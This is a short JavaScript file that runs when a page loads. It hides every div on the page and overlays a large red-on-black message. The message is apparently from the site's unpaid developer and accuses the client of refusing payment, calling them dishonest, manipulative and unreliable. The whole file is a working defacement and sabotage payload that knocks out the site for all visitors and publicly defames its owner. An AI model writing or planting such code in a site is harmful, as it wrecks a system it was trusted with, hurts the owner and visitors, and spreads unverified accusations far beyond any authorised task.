document.addEventListener("DOMContentLoaded", function () {
    // Hide all divs
    document.querySelectorAll("div").forEach(div => {
        div.style.display = "none";
    });

    // Create paragraph element
    const message = document.createElement("p");
    message.innerText = "This client is refusing to pay me. What we agreed on was that I would receive payment for my work, but instead, they keep giving me more work without paying. I built this website for them, and now they have removed my access and are still not giving me my money. Do not work with this client they are completely unprofessional, dishonest, unreliable, manipulative, and a total nightmare to deal with.";

    // Style the paragraph
    message.style.position = "fixed";
    message.style.top = "50%";
    message.style.left = "50%";
    message.style.transform = "translate(-50%, -50%)";
    message.style.fontSize = "40px";
    message.style.fontWeight = "bold";
    message.style.color = "red";
    message.style.background = "black";
    message.style.padding = "20px";
    message.style.textAlign = "center";
    message.style.zIndex = "9999";

    // Append to body
    document.body.appendChild(message);
});